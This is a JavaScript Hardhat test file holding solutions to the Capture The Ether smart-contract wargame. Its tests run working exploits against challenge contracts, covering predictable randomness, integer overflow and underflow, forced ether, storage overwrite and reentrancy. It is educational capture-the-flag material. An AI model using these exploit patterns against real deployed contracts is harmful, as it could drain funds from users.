const { expect } = require("chai");
const { hre, ethers } = require("hardhat");

describe("Capture The Ether", function () {
  it.skip("Guess The Secret Number", async function () {
    const Contract = await ethers.getContractAt(
      "GuessTheSecretNumberChallenge",
      "0xe5D07A2789fC30c9A471d0aBe055A6e18059dc2e"
    );

    const Guesser = await ethers.getContractFactory("Guesser");
    const guesser = await Guesser.deploy();
    await guesser.deployed();

    let answerHash =
      "0xdb81b4d58595fbbbb592d3661a34cdca14d7ab379441400cbfa1b78bc447c365";

    console.log(await guesser.guessAnswer()); //170

    await Contract.guess(await guesser.guessAnswer(), {
      value: "1000000000000000000",
    });
    expect(await Contract.isComplete()).to.be.true;
  });

  it.skip("Guess The Random Number", async function () {
    const Contract = await ethers.getContractAt(
      "GuessTheRandomNumberChallenge",
      "0xd628E60ad0d54e1A307ae253c63C6B57d29992a5"
    );

    // get the slot 0 of the storage where the answer is saved
    let slot0 = await web3.eth.getStorageAt(Contract.address, 0);

    //convert the hexa value to int and call guess
    await Contract.guess(parseInt(slot0), { value: "1000000000000000000" });
    expect(await Contract.isComplete()).to.be.true;
  });

  it.skip("Guess The New Number", async function () {
    const Contract = await ethers.getContractAt(
      "GuessTheNewNumberChallenge",
      "0x9bcB868F01615F7EEEF9F6b821C3C2c88fBb0f34"
    );

    // deploy the contract that imitates the generation of the answer
    const Guesser = await ethers.getContractFactory("GuesserNewNumber");
    const guesser = await Guesser.deploy();
    await guesser.deployed();

    // call the function that guess the number and call guess to the challenge contract
    await guesser.guessTheNumber({ value: "1000000000000000000" });

    // recover the ethers from the guesser contract
    await guesser.withdraw();
    expect(await Contract.isComplete()).to.be.true;
  });

  it.skip("Predict The future", async function () {
    const { mine } = require("@nomicfoundation/hardhat-network-helpers");
    const Contract = await ethers.getContractAt(
      "PredictTheFutureChallenge",
      "0x958e9d80313d8ed09d12e865980bc107C7fc5353"
    );
    // deploy the contract that imitates the generation of the answer
    const Guesser = await ethers.getContractFactory("Predictor");
    const guesser = await Guesser.deploy();
    await guesser.deployed();

    // set the guess in the challenge contract
    await guesser.callLockInGuess(Contract.address, {
      value: "1000000000000000000",
    });

    // mine one block
    await mine();

    // brute force calling settle() and reverting in failure so the guesser varaible isnt deleted
    for (let i = 0; i < 100; i++) {
      try {
        await guesser.makeTheGuess(Contract.address);
        if (await Contract.isComplete()) {
          break;
        }
      } catch (error) {}
    }

    expect(await Contract.isComplete()).to.be.true;
  });

  it.skip("Token Sale", async function () {
    let [account1] = await ethers.getSigners();
    const Contract = await ethers.getContractAt(
      "TokenSaleChallenge",
      "0xA2eAC6Fb81F8F052cD7b5C90BDBC3eb7D3f57422"
    );

    const Test = await ethers.getContractFactory("TokenAttacker");
    const test = await Test.deploy();
    await test.deployed();

    // 415992086870360064 result with overflow
    // 115792089237316195423570985008687907853269984665640564039458 parameter to pass
    // compute the number that will overflow to a value t
    console.log(
      (
        await test.test(
          ethers.BigNumber.from(
            "115792089237316195423570985008687907853269984665640564039457584007913129639935"
          )
            .div("1000000000000000000")
            .add(1)
        )
      ).toString()
    );

    await Contract.buy(
      "115792089237316195423570985008687907853269984665640564039458",
      { value: "415992086870360064" }
    );

    await Contract.sell(1);

    expect(await Contract.isComplete()).to.be.true;
  });

  it.skip("Token Whale", async function () {
    const {
      impersonateAccount,
    } = require("@nomicfoundation/hardhat-network-helpers");
    let [account1, account2] = await ethers.getSigners();
    const Contract = await ethers.getContractAt(
      "TokenWhaleChallenge",
      "0xB9f97d49C5F89923D9de8597E58B0112a8f79F92"
    );

    await impersonateAccount("0xEc948CC31227f0359717c69489cEe7BE7aEFbFD1");
    const player = await ethers.getSigner(
      "0xEc948CC31227f0359717c69489cEe7BE7aEFbFD1"
    );
    console.log(
      (
        await Contract.balanceOf("0xEc948CC31227f0359717c69489cEe7BE7aEFbFD1")
      ).toString()
    );

    await Contract.connect(player).transfer(account1.address, 100);

    await Contract.connect(player).approve(account1.address, 110);

    await Contract.transferFrom(player.address, player.address, 110);

    await Contract.transfer(player.address, 10000000);
    /**
     * Transfer account1 => account2 100 tokens; balance1 = 900 balance2 = 100
     */
    /*  await localContract
      .connect(account2)
      .approve(account1.address, "110000000000000000000"); */

    expect(await Contract.isComplete()).to.be.true;
  });

  it.skip("Retirement Fund", async function () {
    const {
      impersonateAccount,
    } = require("@nomicfoundation/hardhat-network-helpers");
    let [account1, account2] = await ethers.getSigners();
    const Contract = await ethers.getContractAt(
      "RetirementFundChallenge",
      "0x55d1e448772e3a89C4388D5B0E41D5c3796Cb38f"
    );

    const Attacker = await ethers.getContractFactory("RetirementAttacker");
    const attacker = await Attacker.deploy();
    await attacker.deployed();

    await impersonateAccount("0xEc948CC31227f0359717c69489cEe7BE7aEFbFD1");
    let player = await ethers.getSigner(
      "0xEc948CC31227f0359717c69489cEe7BE7aEFbFD1"
    );

    await attacker.connect(player).sendEther(Contract.address, { value: 100 });

    await Contract.connect(player).collectPenalty();
    expect(await Contract.isComplete()).to.be.true;
  });

  it.skip("Mapping", async function () {
    const Contract = await ethers.getContractAt(
      "MappingChallenge",
      "0xa5489Da2ecC074Adc3982eBe412d2C5C671a6C82"
    );

    const MappingTester = await ethers.getContractFactory("MappingTester");
    const mappingTester = await MappingTester.deploy(Contract.address);
    await mappingTester.deployed();

    expect(await Contract.isComplete()).to.be.true;
  });

  it.skip("Donation", async function () {
    const {
      getStorageAt,
    } = require("@nomicfoundation/hardhat-network-helpers");
    const Contract = await ethers.getContractAt(
      "DonationChallenge",
      "0x44c546fa4919D8cd67Dcb37FD43d3c676270ca90"
    );

    const DonationTester = await ethers.getContractFactory("DonationTester");
    const donationTester = await DonationTester.deploy();
    await donationTester.deployed();

    for (let i = 0; i < 2; i++) {
      console.log("Slot %d: ", i, await getStorageAt(Contract.address, i));
    }
    let num1 = ethers.BigNumber.from("1000000000000000000000000000000000000");
    let num2 = ethers.BigNumber.from(
      "1350634594303034131487269957360833128236638519249"
    );

    //msg.value that should be passed to the function
    console.log(num2.div(num1).toString());

    await Contract.donate("0xEc948CC31227f0359717c69489cEe7BE7aEFbFD1", {
      value: "1350634594303",
    });
    for (let i = 0; i < 2; i++) {
      console.log("Slot %d: ", i, await getStorageAt(Contract.address, i));
    }
    //expect(await Contract.isComplete()).to.be.true;
  });

  it.skip("Fifty Years", async function () {
    const {
      getStorageAt,
      impersonateAccount,
    } = require("@nomicfoundation/hardhat-network-helpers");
    const Contract = await ethers.getContractAt(
      "FiftyYearsChallenge",
      "0x9f3C2a92197EC28CbD38A5211c45a4548CC65d7D"
    );

    await impersonateAccount("0xEc948CC31227f0359717c69489cEe7BE7aEFbFD1");
    let player = await ethers.getSigner(
      "0xEc948CC31227f0359717c69489cEe7BE7aEFbFD1"
    );

    for (let i = 0; i < 2; i++) {
      console.log("Slot %d: ", i, await getStorageAt(Contract.address, i));
    }
    // 115792089237316195423570985008687907853269984665640564039457584007913129639935

    let num1 = ethers.BigNumber.from(
      "115792089237316195423570985008687907853269984665640564039457584007913129639935"
    );

    await Contract.connect(player).upsert(1, num1.sub(86399), { value: 1 });

    //console.log(num1.sub(86399).toString());

    await Contract.connect(player).upsert(2, 0, { value: 1 });

    for (let i = 0; i < 2; i++) {
      console.log("Slot %d: ", i, await getStorageAt(Contract.address, i));
    }

    await Contract.connect(player).withdraw(1);

    console.log(
      (await ethers.provider.getBalance(Contract.address)).toString()
    );

    expect(await Contract.isComplete()).to.be.true;
  });

  it.skip("Fuzzy Identity", async function () {
    const Contract = await ethers.getContractAt(
      "FuzzyIdentityChallenge",
      "0x6DA010Bcd4930033BfC1a8Af8584230c41dFF7FF"
    );

    const Authenticator = await ethers.getContractFactory("Authenticator");
    const authenticator = await Authenticator.deploy();
    await authenticator.deployed();

    //await authenticator.callAuthenticate(Contract.address);

    console.log(authenticator.address);
    console.log(
      await authenticator.isBadCode(
        "0xAa8ae2CeB57F92834635471453b5085c49213849"
      )
    );
    //expect(await Contract.isComplete()).to.be.true;
  });

  it.skip("Assume Ownership", async function () {
    const Contract = await ethers.getContractAt(
      "AssumeOwnershipChallenge",
      "0xeFB3d1fd90B9262884dF46682d79f40d2f4e2e20"
    );

    await Contract.AssumeOwmershipChallenge();
    await Contract.authenticate();

    //expect(await Contract.isComplete()).to.be.true;
  });

  it("Token Bank", async function () {
    const {
      impersonateAccount,
    } = require("@nomicfoundation/hardhat-network-helpers");
    const Contract = await ethers.getContractAt(
      "TokenBankChallenge",
      "0x8ACd3167B2bE1A8244Fa18434A869710eEF5f2A4"
    );

    const Token = await ethers.getContractAt(
      "SimpleERC223Token",
      "0xb0dB1D4F6b7633F99521bF719DFDDdbaea046517"
    );

    const BankAttacker = await ethers.getContractFactory("BankAttacker");
    let bankAttacker = await BankAttacker.deploy(
      Contract.address,
      Token.address
    );
    await bankAttacker.deployed();

    await impersonateAccount("0xEc948CC31227f0359717c69489cEe7BE7aEFbFD1");
    let player = await ethers.getSigner(
      "0xEc948CC31227f0359717c69489cEe7BE7aEFbFD1"
    );

    await Token.connect(player).transfer(
      bankAttacker.address,
      "500000000000000000000000"
    );

    await bankAttacker.deposit("500000000000000000000000");

    await bankAttacker.withdraw("500000000000000000000000");

    expect(await Contract.isComplete()).to.be.true;
  });
});
